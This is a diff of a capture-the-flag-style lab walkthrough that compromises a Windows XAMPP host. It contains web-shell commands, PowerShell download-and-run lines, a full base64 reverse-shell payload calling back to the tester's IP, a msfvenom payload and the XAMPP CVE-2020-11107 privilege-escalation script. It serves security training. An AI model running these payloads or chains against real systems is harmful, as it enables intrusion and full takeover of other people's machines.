@@ -1,12 +1,12 @@
-# ip: 192.168.243.180
+# ip: 192.168.123.180
 
-# my: 192.168.45.156
+# my: 192.168.45.227
 
 # reconnaissance
 
 ## port scan
 
-> nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.243.180
+> nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.123.180
 
 ![](https://github.com/user-attachments/assets/16dbbbb0-99bd-453b-9b8b-9284ff265d7d)
 ![](https://github.com/user-attachments/assets/d8cd13a4-8404-43f6-8eb3-b59f019f219f)
@@ -18,20 +18,20 @@
 
 - not found
 
-> ffuf -u http://192.168.243.180 -H "Host:FUZZ.192.168.243.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt
+> ffuf -u http://192.168.123.180 -H "Host:FUZZ.192.168.123.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt
 
 ![](https://github.com/user-attachments/assets/ce24a810-aa5a-40ea-b687-0bb6b11a4545)
 
 ## curl
 
-> curl 192.168.243.180 -s | grep href
+> curl 192.168.123.180 -s | grep href
 
 - assets path found
 - accesssable assets path
 
 ![](https://github.com/user-attachments/assets/3425664b-5071-4c08-b234-f2de9e142d8c)
 
-> curl 192.168.243.180/assets
+> curl 192.168.123.180/assets
 
 - 301
 
@@ -52,24 +52,24 @@ def response(flow: http.HTTPFlow):
 ```
 
 > mitmproxy -s remove_location.py -p 80
-> curl -x http://127.0.0.1:80 http://192.168.243.180/assets
+> curl -x http://127.0.0.1:80 http://192.168.123.180/assets
 
 ![](https://github.com/user-attachments/assets/7a3d6891-e0eb-4994-bf5a-c02e45ff6335)
 
-> curl -x http://127.0.0.1:80 http://192.168.243.180/assets/
+> curl -x http://127.0.0.1:80 http://192.168.123.180/assets/
 
 - accessable assets path
 -
 
 ![](https://github.com/user-attachments/assets/8690c5ce-d443-4327-bb0f-0efe8ddcbd0e)
 
-> curl -x http://127.0.0.1:80 http://192.168.243.180/icons/back.gif
+> curl -x http://127.0.0.1:80 http://192.168.123.180/icons/back.gif
 
 Kevin Hughes, Kevinh@eit.com, September 1995
 
 ![](https://github.com/user-attachments/assets/1651d4dd-019c-4936-be4c-6b77f350aec7)
 
-> curl -X GET -x http://127.0.0.1:80 http://192.168.243.180/assets/icons/folder.gif -O
+> curl -X GET -x http://127.0.0.1:80 http://192.168.123.180/assets/icons/folder.gif -O
 
 mailto:postmaster@localhost -> webmaster
 <span>Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10</span>
@@ -86,7 +86,7 @@ mailto:postmaster@localhost -> webmaster
 
 ## path scan
 
-> ffuf -u http://192.168.243.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403
+> ffuf -u http://192.168.123.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403
 
 ![](https://github.com/user-attachments/assets/8ae2affd-b5db-46fa-b442-62c33de32778)
 
@@ -94,7 +94,7 @@ mailto:postmaster@localhost -> webmaster
 
 ## access blog
 
-> curl http://192.168.243.180/blog/
+> curl http://192.168.123.180/blog/
 
 ![](https://github.com/user-attachments/assets/3e068ecf-1023-4825-87b9-0128c6023f58)
 
@@ -153,44 +153,44 @@ or
 
 anonymous smbclient
 
-> smbclient -L 192.168.243.180
-> smbclient -L //192.168.243.180 -N
+> smbclient -L 192.168.123.180
+> smbclient -L //192.168.123.180 -N
 
 Password for [WORKGROUP\root]:
 session setup failed: NT_STATUS_ACCESS_DENIED
 
 ![](https://github.com/user-attachments/assets/3ec88753-6c82-46d2-a67b-fbbbe62928f0)
 
-smbclient -L //192.168.243.180 -N
+smbclient -L //192.168.123.180 -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 
 ![](https://github.com/user-attachments/assets/47801d7c-c63e-49e0-ab2a-10036d79bea3)
 
 > sudo apt install -y python3-impacket
-> python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.243.180 | tee rpc
+> python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.123.180 | tee rpc
 
-> rpcclient -U '' -N 192.168.243.180
+> rpcclient -U '' -N 192.168.123.180
 
 TCP connection successs but! can not access with anonymous
 
 ![](https://github.com/user-attachments/assets/682a5d96-3d87-428f-9774-6c9790183c3e)
 
-> smbclient -L //192.168.243.180 -N -p 139
-> nmap -p139,445 --script smb-protocols 192.168.243.180
+> smbclient -L //192.168.123.180 -N -p 139
+> nmap -p139,445 --script smb-protocols 192.168.123.180
 
 version >= 2 -> so not used smb1
 
 ![](https://github.com/user-attachments/assets/e31b4ce7-91ab-42e9-8375-3c0f7829f936)
 
 > apt install netexec
-> nxc smb 192.168.243.180 -u '' -p '' --shares
+> nxc smb 192.168.123.180 -u '' -p '' --shares
 
 MIKE-PC -> evidence found
 
 ![](https://github.com/user-attachments/assets/20972255-fe26-4148-afa0-8210d2500a12)
 
 > apt install httpie
-> http http://192.168.243.180/blog/
+> http http://192.168.123.180/blog/
 
 http://monster.pg/blog/home
 http://monster.pg/blog/blog
@@ -201,7 +201,8 @@ http://monster.pg/blog/users/registration
 ![](https://github.com/user-attachments/assets/1762f739-80ad-4934-8a7f-0e26ebe3a8fe)
 
 > vim /etc/hosts
-> echo "192.168.243.180 monster.pg" >> /etc/hosts
+> printf '\n192.168.123.180 monster.pg\n' >> /etc/hosts
+> echo -e "\n192.168.123.180 monster.pg" >> /etc/hosts
 
 ![](https://github.com/user-attachments/assets/623ed7c0-94e2-44dd-a76e-a31b08bccf90)
 
@@ -219,7 +220,7 @@ http://monster.pg/blog/users/registration
 
 ## generate a custom words.txt file
 
-> cewl http://192.168.243.180/ -w words.txt
+> cewl http://192.168.123.180/ -w words.txt
 
 ## bruteforce login
 
@@ -253,20 +254,22 @@ registered: 22.2.2022
 
 ![](https://github.com/user-attachments/assets/20e2bd5b-b114-4e1f-a7aa-da1ef623e94a)
 
+# get a admin temporal session
+
 success
 
 Logging in...
 Login successful
 Preparing shell...
-Your shell is ready: http://monster.pg/blog/public/themes/default/pixiq.chunk.php
+Your shell is ready: http://monster.pg/blog/public/themes/default/tghjm.chunk.php
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=whoami"
 
 mike-pc\mike
 
 ![](https://github.com/user-attachments/assets/7cc53afb-235e-49b5-bb7e-a9d6754d16f9)
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami%20/priv"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=whoami%20/priv"
 
 Privilege Name Description State
 ============================= ==================================== ========
@@ -278,14 +281,14 @@ SeTimeZonePrivilege Change the time zone Disabled
 
 ## reverse shell make
 
-my ip: 192.168.45.156
+my ip: 192.168.45.227
 
-> nc -lvnp 1234
+> nc -lvnp 443
 
 https://www.revshells.com/
 ps#1
 
-> curl 'http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd='
+> curl 'http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd='
 
 > python3 -m http.server 80
 
@@ -295,59 +298,55 @@ ps#1
 
 ![](https://github.com/user-attachments/assets/d5795445-b154-4592-ac40-c6edeea8e1c9)
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/nc.exe -Outfile C:\Windows\Temp\nc.exe"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.227/nc.exe -Outfile C:\Windows\Temp\nc.exe"
 
 curl: (3) URL rejected: Malformed input to a URL function
 
 whitespace -> %20
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.227/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"
 
-> http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/reverse.ps1 -Outfile C:\Windows\Temp\reverse.ps1
+> http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.227/reverse.ps1 -Outfile C:\Windows\Temp\reverse.ps1
 
 failed -> whitespace -> %20
 
-> http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1
+> http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.227/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1
 
 success
 
 ┌──(root㉿docker-desktop)-[/]
 └─# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.243.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200
+192.168.123.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"
 
 Retry
 
 https://www.revshells.com/
 ps#3
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.227/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"
 
-> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"
+> curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"
 
 retry
 
-> curl 'http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami'
+> curl 'http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=whoami'
 
-> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=whoami"
+> curl -G "http://monster.pg/blog/public/themes/default/tghjm.chunk.php" --data-urlencode "cmd=whoami"
 
-> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"
-
-> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguNDUuMTU2JywgMTIzNCk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"
+> curl -G "http://monster.pg/blog/public/themes/default/tghjm.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"
 
 - 무반응
   원인은 Base64 인코딩 형식입니다. 지금 쓰는 Base64는 UTF-8이라 powershell -e가 기대하는 UTF-16LE가 아닙니다. revshells.com이 생성한 UTF-16LE Base64를 그대로 쓰거나, 직접 인코딩할 때 echo -n '...' | iconv -t UTF-16LE | base64 -w 0로 만들어야 합니다. UTF-8 Base64를 넣으면 PowerShell이 명령을 디코딩하지 못해 무반응입니다.
 
 ![](https://github.com/user-attachments/assets/15be2710-9f01-4efa-bed8-71025d60ce0e)
 
-> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"
-
 > apt install netcat-traditional
 > nc -lvnp 443
 
-> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+> curl -G "http://monster.pg/blog/public/themes/default/tghjm.chunk.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
 
 ## reversing success!
 
@@ -359,7 +358,7 @@ retry
 ┌──(root㉿docker-desktop)-[/]
 └─# rlwrap nc -lvnp 443
 listening on [any] 443 ...
-connect to [192.168.45.156] from (UNKNOWN) [192.168.243.180] 49992
+connect to [192.168.45.227] from (UNKNOWN) [192.168.123.180] 49992
 
 PS C:\xampp\htdocs\blog\public\themes\default>
 
@@ -389,7 +388,7 @@ get a local.txt flag
 > ipconfig
 
 Connection-specific DNS Suffix . :
-IPv4 Address. . . . . . . . . . . : 192.168.243.180
+IPv4 Address. . . . . . . . . . . : 192.168.123.180
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 192.168.243.254
 PS C:\Users\Mike>
@@ -511,12 +510,167 @@ Candidates.#01...: alexliamYOUR_SALT_HERE -> LesleeYOUR_SALT_HERE
 
 # try RDP
 
-```bash
-apt search evil-winrm
-apt install evil-winrm -y
-evil-winrm -i 192.168.243.180 -u mike -p Mike14
+## 3389 port opended
+
+on Windows
+
+```ps1
+mstsc /v:192.168.123.180
 ```
+
+![](image.png)
+![](image_1.png)
 
 # Privilege Escalation
 
+## moving a WinPEAS
+
+```bash
+# local
+apt install peass
+python3 -m http.server 80
+
+# windows Invoke-WebRequest
+iwr -uri http://192.168.45.227:80/winPEASany.exe -Outfile winPEASany.exe
+.\WinPEASany.exe
+```
+
 ## transfer winPEAS file
+
+### WinPEAS didn't reveal obvious escalation vectors, but it revealed the httpd.exe process.
+
+Protocol Local Address Local Port Remote Address Remote Port State Process ID Process Name
+
+TCP 0.0.0.0 80 0.0.0.0 0 Listening 5268 c:\xampp\apache\bin\httpd.exe
+TCP 0.0.0.0 135 0.0.0.0 0 Listening 904 svchost
+TCP 0.0.0.0 443 0.0.0.0 0 Listening 5268 c:\xampp\apache\bin\httpd.exe
+TCP 0.0.0.0 445 0.0.0.0 0 Listening 4 System
+
+### check C:\xamp
+
+> type passwords.txt
+
+-a---- 3/13/2017 4:04 AM 824 passwords.txt  
+-a---- 2/21/2022 10:43 PM 792 properties.ini
+
+```txt
+PS C:\xampp> type passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ]
+
+3) Mercury (not in the USB & lite version):
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser
+   Password: wampp
+
+4) WEBDAV:
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so
+
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).
+```
+
+### xampp version 7.3.10-1
+
+> type properties.ini
+
+```
+PS C:\xampp> type properties.ini
+[General]
+installdir=C:\xampp
+base_stack_name=XAMPP
+base_stack_key=
+base_stack_version=7.3.10-1
+base_stack_platform=windows-x64
+```
+
+### searchsploit reveals a promising exploit
+
+XAMPP 7.4.3 - Local Privilege Escalation | windows/local/50337.ps1
+
+![](image_2.png)
+
+### change msf.exe -> shell.exe
+
+```ps1
+# Exploit Title: XAMPP 7.4.3 - Local Privilege Escalation
+# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
+# Original Author: Maximilian Barz (@S1lkys)
+# Date: 27/09/2021
+# Vendor Homepage: https://www.apachefriends.org
+# Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
+# Tested on: Windows 10 + XAMPP 7.3.10
+# References: https://github.com/S1lkys/CVE-2020-11107
+
+$file = "C:\xampp\xampp-control.ini"
+$find = ((Get-Content $file)[2] -Split "=")[1]
+# Insert your payload path here
+$replace = "C:\Temp\msf.exe"
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+```
+
+> iwr -uri http://192.168.45.227:80/50337.ps1 -Outfile change_ini.ps1
+> .\change_ini.ps1
+
+```ps1
+(Get-Content C:\xampp\xampp-control.ini) -replace 'Editor=.*', 'Editor=C:\xampp\msf3.exe' | Set-Content C:\xampp\xampp-control.ini
+```
+
+## check for Editor path whether it is updated
+
+> type xampp-control.ini
+
+# make msf.exe binary
+
+> apt install -y metasploit-framework
+> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f exe -o msf.exe
+> Invoke-WebRequest -uri http://192.168.45.227:80/msf.exe -Outfile C:\xampp\msf3.exe
+
+## reversing reverse shell
+
+```bash
+# kali -> 가능하면 443 이나 80 포트 쓰기 1234, 4444 다 실패함!
+nc -lvnp 443
+```
+
+![](image_4.png)
+
+## trigger
+
+### 직접 실행하면 안 되고, ini 를 읽고 트리거 할 수 있도록 xampp-control.exe 로 수행해야 역역 리버스쉘이 가능
+
+> C:\xampp\xampp-control.exe
+
+PS C:\Users\Administrator\Desktop> ls
+ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode LastWriteTime Length Name
+
+---
+
+-a---- 11/9/2026 6:32 PM 34 proof.txt
+
+PS C:\Users\Administrator\Desktop>
+
+![](image_5.png)
